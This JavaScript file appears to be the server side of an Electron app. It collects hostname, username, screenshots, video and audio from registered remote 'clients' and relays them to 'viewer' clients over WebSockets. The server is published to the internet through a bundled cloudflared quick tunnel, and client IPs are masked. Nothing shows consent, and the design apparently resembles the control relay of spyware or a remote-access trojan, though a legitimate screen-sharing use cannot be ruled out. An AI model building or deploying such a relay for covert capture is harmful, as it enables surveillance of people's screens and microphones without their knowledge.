let liveStreamServer = null;
let liveStreamWSS = null;
let connectedClients = new Map();
let serverPort = 0;
let cloudflaredProcess = null;
let cloudflareTunnelUrl = null;

function startLiveStreamServer() {
    if (liveStreamServer) return { success: true, port: serverPort };
    
    return new Promise((resolve) => {
        const httpServer = createServer();
        liveStreamWSS = new WebSocket.Server({ server: httpServer });
        
        liveStreamWSS.on('connection', (ws, req) => {
            const clientId = Date.now().toString(36) + Math.random().toString(36).substr(2);
            const clientInfo = {
                id: clientId,
                ip: 'ANONYMOUS_IP',
                connectedAt: new Date().toISOString(),
                type: null
            };
            connectedClients.set(clientId, { ws, info: clientInfo });
            
            ws.on('message', (data) => {
                try {
                    const msg = JSON.parse(data.toString());
                    if (msg.type === 'register') {
                        clientInfo.type = msg.clientType;
                        clientInfo.hostname = msg.hostname;
                        clientInfo.username = msg.username;
                        broadcastToViewers({
                            type: 'client-connected',
                            clientId: clientId,
                            info: clientInfo
                        });
                    } else if (msg.type === 'video-frame' || msg.type === 'audio-data' || msg.type === 'screenshot') {
                        broadcastToViewers({
                            type: msg.type,
                            clientId: clientId,
                            data: msg.data,
                            timestamp: msg.timestamp
                        });
                    } else if (msg.type === 'status') {
                        broadcastToViewers({
                            type: 'client-status',
                            clientId: clientId,
                            status: msg.status,
                            message: msg.message
                        });
                    }
                } catch (e) {}
            });
            
            ws.on('close', () => {
                broadcastToViewers({
                    type: 'client-disconnected',
                    clientId: clientId
                });
                connectedClients.delete(clientId);
            });
            
            ws.send(JSON.stringify({ type: 'connected', clientId: clientId }));
        });
        
        const DEFAULT_PORT = 8080;
        httpServer.listen(DEFAULT_PORT, '0.0.0.0', () => {
            serverPort = DEFAULT_PORT;
            liveStreamServer = httpServer;
            resolve({ success: true, port: serverPort });
        }).on('error', (err) => {
            httpServer.listen(9000, '0.0.0.0', () => {
                serverPort = 9000;
                liveStreamServer = httpServer;
                resolve({ success: true, port: serverPort });
            }).on('error', () => {
                httpServer.listen(0, '0.0.0.0', () => {
                    serverPort = httpServer.address().port;
                    liveStreamServer = httpServer;
                    resolve({ success: true, port: serverPort });
                });
            });
        });
    });
}

function broadcastToViewers(data) {
    const msg = JSON.stringify(data);
    connectedClients.forEach(({ ws, info }) => {
        if (info.type === 'viewer' && ws.readyState === WebSocket.OPEN) {
            ws.send(msg);
        }
    });
}

function getServerInfo() {
    const interfaces = os.networkInterfaces();
    const addresses = [];
    for (const name in interfaces) {
        for (const iface of interfaces[name]) {
            if (iface.family === 'IPv4' && !iface.internal) {
                addresses.push(iface.address);
            }
        }
    }
    return {
        running: !!liveStreamServer,
        port: serverPort,
        addresses: addresses,
        clientCount: connectedClients.size
    };
}

ipcMain.on('start-live-server', async (event) => {
    const result = await startLiveStreamServer();
    const info = getServerInfo();
    
    if (result.success && !cloudflaredProcess) {
        try {
            const cloudflaredPath = path.join(__dirname, 'cloudflared.exe');
            const tunnelUrl = `http://localhost:${serverPort}`;
            
            console.log('Starting cloudflared from:', cloudflaredPath);
            console.log('Tunnel target:', tunnelUrl);
            
            cloudflaredProcess = spawn(cloudflaredPath, ['tunnel', '--url', tunnelUrl], {
                shell: true,
                detached: false
            });
            
            let tunnelOutput = '';
            cloudflaredProcess.stdout.on('data', (data) => {
                const output = data.toString();
                console.log('cloudflared stdout:', output);
                tunnelOutput += output;
                const urlMatch = tunnelOutput.match(/https?:\/\/[^\s]+\.trycloudflare\.com/);
                if (urlMatch && !cloudflareTunnelUrl) {
                    cloudflareTunnelUrl = urlMatch[0].replace('http://', 'ws://').replace('https://', 'wss://');
                    console.log('Cloudflare Tunnel URL:', cloudflareTunnelUrl);
                    event.reply('cloudflare-tunnel-url', { url: cloudflareTunnelUrl });
                }
            });
            
            cloudflaredProcess.stderr.on('data', (data) => {
                const output = data.toString();
                console.error('cloudflared stderr:', output);
                tunnelOutput += output;
                const urlMatch = tunnelOutput.match(/https?:\/\/[^\s]+\.trycloudflare\.com/);
                if (urlMatch && !cloudflareTunnelUrl) {
                    cloudflareTunnelUrl = urlMatch[0].replace('http://', 'ws://').replace('https://', 'wss://');
                    console.log('Cloudflare Tunnel URL:', cloudflareTunnelUrl);
                    event.reply('cloudflare-tunnel-url', { url: cloudflareTunnelUrl });
                }
            });
            
            cloudflaredProcess.on('error', (err) => {
                console.error('Failed to start cloudflared:', err);
            });
            
            cloudflaredProcess.on('close', () => {
                cloudflaredProcess = null;
                cloudflareTunnelUrl = null;
            });
        } catch (err) {
            console.error('Failed to start cloudflared:', err);
        }
    }
    
    event.reply('live-server-status', { ...result, ...info, tunnelUrl: cloudflareTunnelUrl });
});

ipcMain.on('get-live-server-info', (event) => {
    const info = getServerInfo();
    event.reply('live-server-status', { ...info, tunnelUrl: cloudflareTunnelUrl });
});

ipcMain.on('stop-live-server', (event) => {
    if (liveStreamWSS) {
        liveStreamWSS.close();
        liveStreamWSS = null;
    }
    if (liveStreamServer) {
        liveStreamServer.close();
        liveStreamServer = null;
    }
    if (cloudflaredProcess) {
        cloudflaredProcess.kill();
        cloudflaredProcess = null;
        cloudflareTunnelUrl = null;
    }
    connectedClients.clear();
    serverPort = 0;
    event.reply('live-server-status', { success: true, running: false, port: 0, tunnelUrl: null });
});

